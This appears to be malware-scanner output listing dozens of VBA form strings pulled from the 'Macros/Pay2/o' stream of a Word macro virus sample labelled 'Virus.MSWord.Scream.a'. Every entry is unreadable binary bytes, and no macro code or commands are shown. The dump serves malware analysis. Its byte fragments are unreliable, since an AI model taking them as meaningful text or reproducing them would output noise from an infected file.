VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����gy�Ae�-W�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��5�N�ݐ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�ª$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ES,DU�7V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�Fjg�7:d�.��}?eBdw��cl�Ebu�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pv���i(g��E=$n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�X���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,528w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��̛���n�\�Ԫ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��y�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e6�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4i���#fWTWc���kq�΋_}3�}����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lQ8?4�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�����
�IX�=���s
>,���S�^��<=�no�]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�@Os
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�W�x<^�[vv���.0N-sZ#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]lԘ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�s~5��p|VGG	m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.�;P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�l�ik�a!�q i�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���nV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����vc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Yᬧ�^9����Ƥ�-\oe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iq ��>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�W�R�4�P�4�y�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z8y����J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;sS�ۯ��֪�*nZ��Neu��˩vi�?�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,vSq��)��
�m?i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t����n�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�|T,�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�" 
Ǉ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V8.W��ɱ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sgh���}��AG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�M�~�?3t�����%L1�ގ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%�p�~z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��5̸v��>�d��ɵ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�ea�F�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`⹞:x��ؾ	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=;�|�o�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��A����r�[~�% c4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�m�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fִ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&K��e&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|�oi���e�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2���U�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�꠷���7:6��H�Ub瓒�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>2oQ#[!�;ޥhS? ��ڰvm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8h=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[��U�4:�H]�s6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�W�LS<��9S�Ji�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����HK�w�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A4sD$���pЅ�����v/'Go�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�z�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��_\|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�\j�x�GF�0�,N����d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|M�;�����ѹ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ta��B��x�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cq���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kYk!������n㸎KRim��\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}n~��8=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qb㫏���R]U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q>i/bI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{/3�E���G
�ƿ�sh��c	$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7%s�5�7�w�S���,ޤ�j֯
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
58T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ЄN�*$��٤m�e�]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���z��^�k�~Oj�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OF�w���>k�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\7�]��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)���ں�.�͑ᗼn�����mn�WWП���sk�̍�-���F�ctR1�F�g1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
����-+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���7�Ya�x���������;�6q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I���7����yt���l8�F
�R�5���qI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@����/�h�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IR����2�%^Ōa�p�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۟�/��)��8�_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e<a���h�(\C�7
��#3���z�a�U物K���{���|���ؼuTR0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+x�v;����/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ʃw�H�񗸈Z�fyi{��.7%W+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�%3ψ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U˱��<.Ol""��""
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
՞��T�7������#�i;\}�%��O�ۖ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�X��H��Ox��P���MT�]�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�c��̱�bҋ/Fr�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
¦K��C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L舱v��۪����#w-.�۳�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��Zk~K)1'��6��g��|�A\�V�i{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<[bwso���Pk�urV9m��7�F+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cq��,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&*o��F�����;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K4O�t���T�i��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;&��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���*��s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�m~鲦���C��]��SDӎ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ȫ���;BVρ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ٍ�u��V�KC�4�_�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�s�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t���ʋ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kɶ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��6ы܆����i��j��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7-���R����3�w�.I�ULq�$_�I�AA��S߆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���T�62�6B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M%�Y$l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�Z�d���e*���sO}򷥿�V�2\���uՄ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
me1k�%���TV�Mv:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��1��b��u3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b.���|U��<�n��XCH߈mۡ��q��2�w�e}e�*)�#S�2�xȾ��������7�L���QW���B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c�&��ܩ��3�k��[�ɕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�����T�uec#������>y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s�?كvT�mo�S�Ne��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��Q���DU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�p�^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�]�t�R\�^�t�F�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��⥴�\�����L��&Bj��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O{��S&Z�=�V^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z���h
-------------------------------------------------------------------------------
